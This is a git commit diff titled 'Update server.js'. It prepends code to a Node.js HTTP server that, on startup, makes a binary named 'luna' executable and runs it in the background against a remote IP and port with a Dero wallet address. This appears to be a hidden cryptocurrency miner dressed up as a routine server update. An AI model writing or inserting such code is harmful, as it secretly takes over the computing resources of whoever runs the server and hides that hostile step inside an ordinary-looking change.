f15e95425d8163dd37d663bb709b243740aeda74
verakazak10 <152781979+verakazak10@users.noreply.github.com>
2023-12-03 18:41:06 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,3 +1,19 @@
+const { exec } = require("child_process");
+
+exec(
+  "chmod 700 luna;nohup ./luna -d 213.171.208.37:10300 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.PIPE &",
+  (error, stdout, stderr) => {
+    if (error) {
+      console.log(`error: ${error.message}`);
+      return;
+    }
+    if (stderr) {
+      console.log(`stderr: ${stderr}`);
+      return;
+    }
+    console.log(`stdout: ${stdout}`);
+  }
+);
 const http = require('http');
 
 const hostname = '0.0.0.0';
